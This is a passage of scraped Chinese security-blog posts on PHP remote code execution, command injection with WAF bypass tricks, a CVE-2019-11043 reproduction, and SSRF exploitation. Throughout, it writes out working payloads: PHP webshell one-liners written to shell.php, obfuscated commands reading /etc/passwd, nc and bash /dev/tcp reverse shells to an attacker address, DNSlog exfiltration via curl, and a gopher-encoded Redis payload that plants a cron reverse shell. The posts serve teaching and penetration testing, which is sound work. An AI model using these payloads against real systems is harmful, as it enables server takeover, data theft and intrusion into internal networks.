//?cmd=phpinfo()$cmd=$_GET[&#x27;cmd&#x27;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);?&gt; g、array_filter()array array_filter(array $array [, callable $callback [, int $flag = 0 ]] ) &emsp;&emsp;依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。 &lt;?php //?func=system&amp;cmd=whoami$cmd=$_GET[&#x27;cmd&#x27;];$array1=array($cmd);$func =$_GET[&#x27;func&#x27;];array_filter($array1,$func);?&gt; h、usort()、uasort()&emsp;&emsp;usort()通过用户自定义的比较函数对数组进行排序。 &emsp;&emsp;uasort()使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。 &emsp;&emsp;代码示例： php环境&gt;=5.6才能用&lt;?php usort(...$_GET);?&gt;利用方式：test.php?1[]=1-1&amp;1[]=eval($_POST[&#x27;x&#x27;])&amp;2=assert[POST]:x=phpinfo();php环境&gt;=&lt;5.6才能用&lt;?php usort($_GET,&#x27;asse&#x27;.&#x27;rt&#x27;);?&gt;利用方式：test.php?1=1+1&amp;2=eval($_POST[x])[POST]:x=phpinfo(); 参考链接：https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html i、文件操作函数&emsp;&emsp;file_put_contents() 函数把一个字符串写入文件中。 &emsp;&emsp;fputs() 函数写入文件 &emsp;&emsp;代码示例： &lt;?php $test=&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;;file_put_contents(&#x27;test1.php&#x27;,$test);?&gt;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;); ?&gt; j、动态函数&emsp;&emsp;PHP函数直接由字符串拼接 &emsp;&emsp;代码示例： &lt;?php //?a=assert&amp;b=phpinfo()$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);?&gt; （2）Java待更新….. （3）Python待更新….. 2、产生（1）Web源码 thinkphp eyoucms wordpress （2）中间件平台 Tomcat apache struts2 Redis Nginx：PHP 远程代码执行漏洞复现（CVE-2019-11043） （3）其他环境 php-cgi jenkins-cl java RMI 3、监测（1）白盒 代码审计 （2）黑盒 漏扫工具 公开漏洞 手工看参数及功能点 4、防御 敏感函数禁用 变量过滤或固定 waf产品 二、命令执行1、命令执行漏洞原理&emsp;&emsp;应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、 pcntl_exec、popen、proc_popen、 反引号等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞 （1）system()system — 执行外部程序，并且显示输出 (PHP 4, PHP 5, PHP 7, PHP 8) 语法：system(string $command, int &amp;$return_var = ?): string 参数： command为要执行的命令。 return_var如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。 返回值： 成功则返回命令输出的最后一行， 失败则返回 false 同 C 版本的 system() 函数一样， 本函数执行 command 参数所指定的命令， 并且输出执行结果。 如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。 如果要获取一个命令未经任何处理的原始输出， 请使用 passthru() 函数。 &lt;?phpecho &#x27;&lt;pre&gt;&#x27;;// 输出 shell 命令 &quot;ls&quot; 的返回结果// 并且将输出的最后一样内容返回到 $last_line。// 将命令的返回值保存到 $retval。$last_line = system(&#x27;ls&#x27;, $retval);// 打印更多信息echo &#x27;&lt;/pre&gt;&lt;hr /&gt;Last line of the output: &#x27; . $last_line . &#x27;&lt;hr /&gt;Return value: &#x27; . $retval;?&gt; （2）exec()exec — 执行一个外部程序 (PHP 4, PHP 5, PHP 7, PHP 8) 语法：exec(string $command, array &amp;$output = ?, int &amp;$return_var = ?): string 参数： command要执行的命令。 output如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \\n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前对数组使用 unset() 函数进行重置。 return_var如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。 返回值：命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。 如果想要获取命令的输出内容， 请确保使用 output 参数。 注意：在 Windows 下，exec() 函数会先启动 cmd.exe 来执行指定的命令。如果你希望启动一个额外的应用而不用先启动 cmd.exe 可使用 proc_open() 函数加上 bypass_shell 参数。 &lt;?php// 输出运行中的 php/httpd 进程的创建者用户名// （在可以执行 &quot;whoami&quot; 命令的系统上）echo exec(&#x27;whoami&#x27;);?&gt; （3）passthru()passthru — 执行外部程序并且显示原始输出 (PHP 4, PHP 5, PHP 7, PHP 8) 语法：passthru(string $command, int &amp;$return_var = ?): void command 要执行的命令。 return_var如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。 返回值：没有返回值 同 exec() 函数类似， passthru() 函数也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。 （4）shell_exec()shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。 语法：shell_exec(string $cmd): string，本函数同执行操作符 返回值：命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 null。 注意： 当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 null， 所以，使用本函数无法通过返回值检测进程是否成功执行。 如果需要检查进程执行的退出码，请使用 exec() 函数。 &lt;?php$output = shell_exec(&#x27;ls -lart&#x27;);echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;?&gt; （5）执行运算符（反引号`）PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“\\”的效果与函数 shell_exec() 相同。 注意： 关闭了 shell_exec() 时反引号运算符是无效的。与其它某些语言不同，反引号不能在双引号字符串中使用。 &lt;?php$output = `ls -al`;echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;?&gt; （6）proc_open()proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。 (PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8) 语法： proc_open( mixed $cmd, array $descriptorspec, array &amp;$pipes, string $cwd = null, array $env = null, array $other_options = null): resource 类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力。 具体参考：https://www.php.net/manual/zh/function.proc-open.php 2、命令执行漏洞利用条件 应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严 3、漏洞分类（1）代码层过滤不严&emsp;&emsp;商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(&quot;/bin/program --arg $arg&quot;); （2）系统的漏洞造成命令注入&emsp;&emsp;bash破壳漏洞（CVE-2014-6271） （3）调用的第三方组件存在代码执行漏洞 如wordPress中用来处理图片的imageMagick组件 JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等） ThinkPHP命令执行 4、漏洞危害 继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至服务器 进一步内网渗透 等等 5、命令执行漏洞攻击&emsp;&emsp;页面rec.php提供了ping的功能，当给参数IP输入127.0.0.1时，程序会执行ping 127.0.0.1，然后将ping的结果返回到页面上 &emsp;&emsp;而如果将参数IP设置为127.0.0.1|dir，然后再次访问，从返回结果可以看到，程序直接将目录结构返回到页面上了，这里就利用了管道符”|”让系统执行了命令dir （1）命令拼接符 |、||、&amp;、&amp;&amp; 的区别： &amp; 不管前后命令是否执行成功都会执行前后命令 &amp;&amp; 具有短路效果。 前面的命令执行成功才能执行后面的命令 | 管道符， 上一条命令的输出，作为下一条命令参数(输入) 。在拼接时，无论左边是false还是true，右边都会执行 || 具有短路效果。 前面的命令执行不成功才能执行后面的命令 （2）Windows系列支持的管道符 **|**：直接执行后面的语句，例如：ping 127.0.0.1|whoami **||**：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如ping 2||whoami **&amp;**：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami **&amp;&amp;**：如果前面的语句为假直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami （3）Linux系统支持的管道符 ; ：无论前面真假，执行完前面的语句再执行后面的。例如：ping 127.0.0.1;whoami **|**：显示后面语句执行的结果，例如：ping 127.0.0.1|whoami **||**：当前面执行的语句出错时，执行后面的语句。例如ping 1||whoami **&amp;**：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami **&amp;&amp;**：如果前面的语句为假直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami （4）例子分析 ping 127.0.0.1&amp;ipconfig #在linux系统里是几乎同时执行 ping 127.0.0.1 &amp;&amp; ipconfig #在linux系统里执行完前面再去执行后面 ping 127.0.0.1 &amp;;&amp; ipconfig #其中**;**会被解析为空 ping 127.0.0.1 || ipconfig #在linux中两个**||** = or ping 127.0.0.1 | ipconfig #在linux中**|**叫管道符，把前面一个命令执行的结果给后面的命令执行 6、命令执行漏洞代码分析&emsp;&emsp;服务端处理ping的代码如下所示，程序获取GET参数IP，然后拼接到system()函数中，利用system()函数执行ping的功能，但是此处没有对参数IP做过滤和检测，导致可以利用管道符执行其他的系统命令 &lt;?phpecho system(&quot;ping -n 2 &quot; . $_GET[&#x27;ip&#x27;]);?&gt; 当我们发现一台主机有RCE 查看当前权限 当前所在目录 用户类型 是否可以写入一句话木马 是否可以开启一个服务器写入exp进行提权 7、命令执行漏洞修复建议 尽量不要使用命令执行函数 客户端提交的变量再进入执行命令函数前要做好过滤和检测 在使用动态函数之前，确保使用的函数是指定的函数之一 对PHP语言来说，不能完全控制的危险函数最好不要使用 三、命令执行WAF绕过技巧&emsp;&emsp;语法： 字符 解释 * 匹配任意长度任意字符 ? 匹配任意单个字符 [list] 匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合 [^list] 匹配指定范围外的任意单个字符或字符集合 [!list] 同[^list] {str1,str2,…} 匹配 srt1 或者 srt2 或者更多字符串，也可以是集合 &emsp;&emsp;专用字符集： 字符 意义 [:alnum:] 任意数字或者字母 [:alpha:] 任意字母 [:space:] 空格 [:lower:] 小写字母 [:digit:] 任意数字 [:upper:] 任意大写字母 [:cntrl:] 控制符 [:graph:] 图形 [:print:] 可打印字符 [:punct:] 标点符号 [:xdigit:] 十六进制数 [:blank:] 空白字符（未验证） &emsp;&emsp;Linux Shell元字符，在使用通配符时如果没有进行转义可能就会被辨识为元字符 字符 作用 IFS 由 &lt; space &gt; 或 &lt; tab &gt;或 &lt; enter &gt; 三者之一组成 CR 由 &lt; enter &gt; 产生 = 设定变量 $ 作变量或运算替换 &gt; 重导向标准输出 &lt; 重导向标准输入 | 命令管线 &amp; 重导向文件描述符，或将命令静默执行 ( ) 将其内的命令置于 nested subshell 执行，或用于运算或命令替换 { } 将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围 ; 在前一个命令结束时，而忽略其返回值，继续执行下一个命令 &amp;&amp; 在前一个命令结束时，若返回值为 true，继续执行下一个命令 || 在前一个命令结束时，若返回值为 false，继续执行下一个命令 ! 执行 history 中的命令 1、面对屏蔽关键词（黑名单绕过）（1）使用连接符a、单引号/双引号&emsp;&emsp;比如有的Linux会屏蔽ls，可以使用单引号进行绕过。例如127.0.0.1 | l&#39;s&#39;来进行绕过，但是要谨记一点：引号的个数必须要是偶数个，才能完成闭合（命令完成闭合，文件/目录名完成闭合，不能命令中一个引号和文件/目录中一个引号闭合，这样无法闭合） b、反斜杠\\&emsp;&emsp;\\c\\a\\t pas\\s\\.tx\\t，不用闭合，想多少个就多少个。但注意不要两个\\在一块，否则会\\会被转义成字符串\\ （2）使用类似命令a、读文件绕过(1) cat(2) paste: 会把每个文件以列对列的方式，一列列地加以合并(3) more: 一页一页的显示档案内容(4) less: 与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页(5) head: 查看头几行(6) tac: 从最后一行开始显示，可以看出 tac 是 cat 的反向显示(7) tail: 查看尾几行(8) nl：显示的时候，顺便输出行号(9) od: 以二进制的方式读取档案内容(10) vi: 一种编辑器，这个也可以查看(11) vim: 一种编辑器，这个也可以查看(12) sort: 可以查看(13) uniq: 可以查看(14) file -f: 报错出具体内容$ more ts1 //查看文件ts112$ more ts2 //查看文件ts2catpaste$ cat ts1 ts2 //按行合并12catpaste$ paste ts1 ts2 //按列合并1 cat2 paste （3）使用通配符a、低阶用法&emsp;&emsp;屏蔽了php：127.0.0.1 | c&#39;a&#39;t ../haha.ph* 127.0.0.1 | c&#39;a&#39;t ../haha.ph? &emsp;&emsp;屏蔽了命令和路径等：/bin/cat /etc/passwd 变成 /???/c?t /??c/p???w? ，有时候WAF不允许使用太多的?号就/?in/c?t /?tc/p?sswd /???/[l-n]s 可替代ls/???/c?t flag 可替代cat flagls *.php 列出当前目录下所有php文件 b、进阶用法（无字母数字匹配）&emsp;&emsp;如果我们遇到一个正则将 字母、数字、$ 这些都过滤掉，要我们执行一个脚本的话，假如脚本名称为chakdiD且在根目录/etc下，我们可以用： . /???/??????[@-[][@-[]表示取从@到[之间的字符，这之间的字符都为大写字母。这样就实现了无字母数字匹配的命令，就可以绕过正则了。 &emsp;&emsp;几个例子： /???/[:lower:]s/?s?/???/[n]c 2130706433 8888 -e /???/b??hls &#123;/ru,/tmp&#125;n （4）变量拼接kali@kali: a=c;b=at;c=fl;d=ag;$a$b $c$dyou are good! （5）编码绕过a、进制编码&emsp;&emsp;参考https://zhidao.baidu.com/question/628764933342214124.html &emsp;&emsp;对应于ACSII码，\\是八进制转义字符，\\x为十六进制转义字符 $(printf &quot;\\154\\163&quot;) ==&gt;ls$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) ==&gt;cat /flag&#123;printf,&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;&#125;|\\$0 ==&gt;cat /flag &emsp;&emsp;例子 kali@kali: $(printf &quot;\\154\\163&quot;)firefox-esr.desktop flag b、Base64编码kali@kali: `echo &#x27;Y2F0Cg==&#x27; | base64 -d` flagyou are good! （6）空格过滤a、${IFS}&emsp;&emsp;在shell中，有一个好用的环境变量$IFS，IFS表示 Internal Field Separator （内部字段分隔符），默认是空格符 &emsp;&emsp;bash下的很多命令都会分割单词，绝大多数时候默认是采用空格作为分隔符，有些时候遇到制表符、换行符也会进行分隔。最典型的是”for i in a b c“，它会分割变量列表”a b c”使其成为三个变量。这种分隔符是由IFS变量指定的 &emsp;&emsp;默认的IFS在碰到空格、制表符\\t和分行符\\n就会自动分隔进入下一步。但是对空格处理有点不一样，对行首和行尾两边的空格不处理，并且多个连续的空格默认当作一个空格 cat$&#123;IFS&#125;/etc/passwd b、$IFS$9&emsp;&emsp;$9指传过来的第9个参数 kali@kali: cat$IFS$9flagyou are good!kali@kali: cat$IFS$1flagyou are good! c、%20、%09(tab)（需要PHP环境，不演示）d、&lt;或者&lt;&gt;重定向kali@kali: cat&lt;flagyou are good!kali@kali: cat&lt;&gt;flagyou are good! （7）nc反弹shellnc -e /bin/bash 192.168.0.104 3456 &emsp;&emsp;为了避免符号，可以将IP地址转换成整型：nc -e /bin/bash 3232235624 3456 &emsp;&emsp;使用通配符： /??n/?c -e /??n/b??h 3232235624 3456 &emsp;&emsp;或者 黑客：nc -lvv 8888靶机：?cmd=bash -i &gt;&amp; /dev/tcp/x.x.x.x/8888 0&gt;&amp;1 [+] bash -i，意为创建一个交互式的bash shell [+] 0，STDIN_FILENO，标准输入（一般是键盘） 1，STDOUT_FILENO，标准输出（一般是显示屏，准确的说是用户终端控制台） 2，STDERR_FILENO，标准错误（出错信息输出） 1&gt;，只写&gt;而省略不写数字则默认就是 1 同理，输入重定向0&lt;省略不写则默认就是 0 [+] 2&gt;&amp;1&amp;的意义，用来将标准错误2重定向到标准输出1中的。此处1前面的&amp;就是为了让bash将1解释成标准输出而不是文件1。至于最后一个&amp;，则是让bash在后台执行。 [+] /dev/tcp/192.168.1.1/8888，这是一个特殊文件，它会建立一个连接到192.168.1.1:8888的socket意思就是：bash -i创建一个交互式的bash，&amp;&gt;将bash的标准输出重定向到/dev/tcp/192.168.1.1/9090的socket连接上，0&gt;&amp;1将标准输入重定向到标准输出，最终的结果就是标准输入也被重定向到了TCP连接中，因此输入和输出都可以在公网主机上进行，通过TCP连接和bash进行交互。 参考链接：https://blog.csdn.net/Auuuuuuuu/article/details/89059176 （8）使用未初始化的bash变量&emsp;&emsp;在bash环境中允许我们使用未初始化的bash变量，比如 $a,$b,$c 我们事先并没有定义它们，输出看看: root@kali:~# echo $aroot@kali:~# echo $broot@kali:~# echo $croot@kali:~# &emsp;&emsp;未初始化的变量值都是Null &emsp;&emsp;读取/etc/passwd： cat$a /etc$a/passwd$a &emsp;&emsp;测试WAF： &lt;?phpecho &quot;OK&quot;;system(&#x27;dig&#x27;.$_GET[&#x27;host&#x27;]);?&gt; &emsp;&emsp;which指令会在环境变量$PATH设置的目录里查找符合条件的文件 ，先找出nc文件路径：www.baidu.com;$s/bin$s/which$s nc$s &emsp;&emsp;知道nc在哪里了，反弹shell：www.baidu.com;/bin$s/nc$s -e/bin$s/bash$s 3232235624 3456，-e后面有没有空格都可以 2、有的文件无法执行&emsp;&emsp;先赋予执行权限再运行 chm&#x27;o&#x27;d 777 ./key.phpchm\\o\\d 777 ./key.php 3、直接读取文件127.0.0.1;curl file:///etc/passwd 4、利用dnslog或者http web logls | curl xxx.ceye.io/whoami`` 5、绕过长度限制（1）&gt;和&gt;&gt;&emsp;&emsp;使用&gt;命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入 &emsp;&emsp;&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容 （2）命令换行&emsp;&emsp;换行执行命令 kali@kali:~/桌面$ ca\\&gt; t\\&gt; fl\\&gt; agyou are good! &emsp;&emsp;可以尝试写一个文件来执行命令 kali@kali: echo &quot;ca\\\\&quot;&gt;shellkali@kali: echo &quot;t\\\\&quot;&gt;&gt;shellkali@kali: echo &quot; fl\\\\&quot;&gt;&gt;shellkali@kali: echo &quot;ag&quot;&gt;&gt;shellkali@kali: cat shellca\\t\\ fl\\agkali@kali: sh shellyou are good! 6、内敛执行绕过&emsp;&emsp;命令和$(命令)都是执行命令的方式 &emsp;&emsp;例子 kali@kali: echo &quot;m0re`cat flag`&quot;m0reyou are good!kali@kali: echo &quot;m0re $(cat flag)&quot;m0re you are good!kali@kali: echo &quot;m0re $(pwd)&quot;m0re /root 四、涉及资源 JAVA web网站代码审计－－入门 PHP 远程代码执行漏洞复现（CVE-2019-11043） 墨者靶场——PHP代码分析溯源(第4题) 墨者靶场——命令注入执行分析 墨者靶场——Webmin未经身份验证的远程代码执行","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://wolke.cn/tags/RCE/"}],"author":"w01ke"},{"title":"CVE-2019-11043（PHP远程代码执行漏洞）","slug":"CVE-2019-11043（PHP远程代码执行漏洞）","date":"2022-02-12T15:06:40.000Z","updated":"2022-03-09T04:43:25.606Z","comments":true,"path":"post/4f87817f.html","link":"","permalink":"https://wolke.cn/post/4f87817f.html","excerpt":"","text":"一、漏洞描述&emsp;&emsp;CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。 &emsp;&emsp;向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。 &emsp;&emsp;该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下： location ~ [^/]\\.php(/|$) &#123; ... fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... &#125; &emsp;&emsp;攻击者可以使用换行符（％0a）来破坏fastcgi_split_path_info指令中的Regexp。 Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。 二、影响范围&emsp;&emsp;在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行： ● PHP 7.0 版本 ● PHP 7.1 版本 ● PHP 7.2 版本 ● PHP 7.3 版本 三、漏洞复现&emsp;&emsp;使用 P 牛的 docker 环境进行复现： &emsp;&emsp;PHP-FPM 远程代码执行漏洞（CVE-2019-11043） 1、安装docker、golang环境sudo apt-get install docker docker-composesudo apt install golang 2、搭建漏洞环境git clone https://github.com/vulhub/vulhub.gitcd vulhub/php/CVE-2019-11043 &amp;&amp; docker-compose up -d ​ &emsp;&emsp;启动环境之后，就可以看到漏洞环境的默认页面。在此为http://127.0.0.1:8080/index.php 3、安装漏洞利用工具git clone https://github.com/neex/phuip-fpizdam.gitcd phuip-fpizdamgo get -v &amp;&amp; go build &emsp;&emsp;报错原因：默认使用的是proxy.golang.org，在国内无法访问 &emsp;&emsp;换一个国内能访问的代理地址：https://goproxy.cn。重新执行命令即可 go env -w GOPROXY=https://goproxy.cngo get -v &amp;&amp; go build 4、漏洞利用go run . &quot;http://127.0.0.1:8080/index.php&quot; &emsp;&emsp;访问http://127.0.0.1/index.php?a=id 注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。 curl ip.sb为Linux中查询公网IP的命令 四、参考链接 https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md https://github.com/neex/phuip-fpizdam http://blog.leanote.com/post/snowming/9da184ef24bd","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"中间件","slug":"中间件","permalink":"https://wolke.cn/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"}],"author":"w01ke"},{"title":"SSRF服务器端请求伪造攻击","slug":"SSRF服务器端请求伪造攻击","date":"2022-02-07T14:49:10.000Z","updated":"2022-02-11T10:19:22.319Z","comments":true,"path":"post/98624e3.html","link":"","permalink":"https://wolke.cn/post/98624e3.html","excerpt":"","text":"一、SSRF概述&emsp;&emsp;SSRF(Server-Side Request Forgery：服务器端请求伪造)，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。 &emsp;&emsp;其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据 &emsp;&emsp;数据流：攻击者—–&gt;服务器—–&gt;目标地址 &emsp;&emsp;根据后台使用函数的不同，对应的影响和利用方法又有不一样 &emsp;&emsp;PHP中下面函数的使用不当会导致SSRF: file_get_contents()fsockopen()curl_exec() &emsp;&emsp;如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求，则请做好目标地址的过滤。 &emsp;&emsp;你可以根据“SSRF”里面的项目来搞懂问题的原因 二、原理&emsp;&emsp;很多Web应用都提供了从其他的服务器上获取数据的功能，根据用户指定的URL，Web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。一般情况下，SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。 三、利用SSRF可以实现的攻击&emsp;&emsp;攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。 对外网、服务器所在的内网、本地进行端口扫描，获取一些服务的Banner信息 攻击运行在内网或本地的应用程序 对内网Web应用进行指纹识别，识别企业内部的资产信息 攻击内外网的Web应用，主要是使用GET请求就可以实现的攻击（比如: Struts2、 sqli） 下载内网资源(如：利用file协议读取本地文件等) 进行跳板 无视cdn 利用Redis未授权访问，HTTP CRLF注入实现getshell 四、SSRF漏洞相关函数和协议1、PHP函数&emsp;&emsp;file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞 （1）file_get_contents()&emsp;&emsp;file_get_contents函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_contents函数把一个字符串写入文件中。 &emsp;&emsp;比如以下代码在Win10上部署，这段代码使用file_get_contents()函数从用户指定的URL获取图片并展示给用户。和Win10同一内网的Kali在8000端口服务开启了只供内部人员使用的资料比如ssrf_flag，此时如果攻击者提交如下Payload，就可以获取到内网主机HTTP服务8000端口的开放情况 &lt;?php $url = $_GET[&#x27;url&#x27;]; echo file_get_contents($url);?&gt; （2）fsockopen()&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \\n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .= &quot;\\r\\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt;fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限 （3）curl_exec()&lt;?php if (isset($_POST[&#x27;url&#x27;]))&#123; $link = $_POST[&#x27;url&#x27;]; $curlobj = curl_init();// 创建新的 cURL 资源 curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项 $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器 curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源 $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; file_put_contents($filename, $result); echo $result;&#125;?&gt;curl_exec函数用于执行指定的cURL会话 （4）注意1. 一般情况下PHP不会开启fopen的gopher wrapper2. file_get_contents的gopher协议不能URL编码3. file_get_contents关于Gopher的302跳转会出现bug，导致利用失败4. curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用5. curl_exec() //默认不跟踪跳转6. file_get_contents() // file_get_contents支持php://input协议 2、协议（1）file&emsp;&emsp;在有回显的情况下，利用 file 协议可以读取任意内容 file:///etc/passwdfile:///etc/apache2/apache2.conf （2）dict&emsp;&emsp;泄露安装软件版本信息，查看端口，操作内网Redis服务等 dict://192.168.15.111:22 //读取本地服务器22端口信息dict://dict://192.168.15.51:22 //读取和本地服务器相通的服务器22端口信息 （3）Gopher&emsp;&emsp;Gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合Gopher协议的请求。Gopher协议是SSRF利用中一个最强大的协议（俗称万能协议）。可用于反弹shell （4）http/s&emsp;&emsp;探测内网主机存活 五、容易出现SSRF漏洞的地方（1）从WEB功能上寻找 分享：通过URL地址分享网页内容 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等 图片加载与下载：通过URL地址加载或下载图片 图片、文章收藏功能 未公开的api实现 网站采集、网页抓取的地方。 头像的地方。(远程加载头像) 一切要你输入网址的地方和可以输入ip的地方。 （2）从URL关键字中寻找sharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain...... 六、SSRF漏洞利用1、本地利用&emsp;&emsp;以curl举例，查看 curl 支持的协议列表 curl -V （1）使用file协议 file protocol (任意文件读取)curl -v &#x27;file:///etc/passwd&#x27; （2）使用dict协议 dict protocol (获取Redis配置信息)curl -v &#x27;dict://127.0.0.1:6379/info&#x27; （3）使用Gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)curl -v &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27; 